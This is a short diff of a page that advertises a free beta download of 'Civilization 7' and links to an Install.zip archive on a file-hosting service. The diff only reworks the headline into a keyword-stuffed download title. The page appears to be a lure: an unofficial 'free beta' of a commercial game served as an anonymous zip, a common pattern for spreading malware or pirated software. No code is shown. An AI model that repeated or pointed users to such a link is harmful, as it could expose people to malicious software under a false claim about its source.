@@ -1,5 +1,5 @@
 # **Civilization 7**  
-**🏛️ Build Your Empire in the Beta Version — Free Download! 🏛️**  
+**🏛️ civilization 7 download Free Beta Version ! 🏛️**  
 
 **Download Now:**  
 [Download for Windows](https://download1076.mediafire.com/jehqxum7woygl-6MfuUBlTbp4TOZmk4iUILqx2ZrYi9waThJN0V-OCKnH2a6XPASm-1SIMMUYKDncfrToAAr9BNahX18tlFI8uGeVkj_dhQqfuBLIQdic5ENPA9PCvy3yvG7QYEuOFRPH6ot1dzQmMvA86hsihjeIAY0rSYcLHlJ/vfpk9dpxrjjupr9/Install.zip) 
